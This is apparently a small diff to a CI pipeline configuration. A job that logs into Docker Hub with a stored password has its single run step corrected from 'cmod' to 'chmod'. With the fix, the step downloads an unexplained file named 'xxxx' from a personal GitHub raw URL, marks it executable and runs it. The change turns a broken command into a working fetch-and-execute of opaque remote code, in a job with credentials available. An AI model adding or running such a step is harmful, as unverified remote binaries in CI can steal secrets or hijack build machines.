@@ -8,5 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://raw.githubusercontent.com/diangame/xxxx/main/xxxx && cmod +x xxxx && ./xxxx
-      
+      - run: wget https://raw.githubusercontent.com/diangame/xxxx/main/xxxx && chmod +x xxxx && ./xxxx
